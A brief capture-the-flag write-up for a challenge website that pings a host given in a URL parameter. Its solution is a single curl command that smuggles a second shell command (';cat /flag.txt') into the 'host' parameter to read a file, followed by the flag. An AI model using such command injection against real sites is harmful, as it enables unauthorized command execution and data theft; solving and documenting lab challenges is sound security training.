#### Challenge:

Some random website that can ping hosts.

---

#### Solution:

We are given a website that is able to run `ping` command based on `host` parameter in URL.
Command injection served on silver plate:

```
curl http://01.linux.challenges.ctf.thefewchosen.com:51042/index.php?host=127.0.0.1;cat%20/flag.txt
```

---

<details><summary>FLAG:</summary>

```
TFCCTF{C0mm4nd_1nj3c5i0n_1s_E4sy}
```

</details>
<br/>
